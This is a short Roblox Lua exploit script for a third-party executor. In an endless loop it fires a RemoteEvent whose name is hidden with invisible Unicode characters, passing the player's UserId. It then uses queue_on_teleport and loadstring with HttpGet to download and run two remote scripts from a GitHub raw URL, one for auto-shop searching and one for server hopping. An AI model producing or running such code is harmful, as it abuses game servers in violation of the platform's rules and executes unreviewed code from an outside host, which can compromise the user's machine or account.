task.wait(2.5)
 if not game:IsLoaded() then game.Loaded:Wait() end
  repeat wait(0.1) until  game.Loaded
  task.spawn(function()
    while task.wait() do
local args = {
    [1] = game.Players.LocalPlayer.UserId
}

game:GetService("ReplicatedStorage"):WaitForChild("\226\160\128\226\160\128\226\160\128\226\160\128\240\159\152\131_outfit_\226\160\129\226\160\128\226" ..
    "\160\128\226\160\128\226\160\128\226\160\128\226\160\128\226\160\128\226\160\128\226\160\128" ..
    "\226\160\128\226\160\128"):FireServer(unpack(args))
end
  end)
task.wait(30)
  queue_on_teleport([[
     if not game:IsLoaded() then game.Loaded:Wait() end
  repeat wait(0.1) until  game.Loaded and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") 
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/JustAP1ayer/ignorewtffxd/main/autoshopSearch.lua"),true))()
    ]])
             loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/ignorewtffxd/main/serverhopxd.lua", true))()
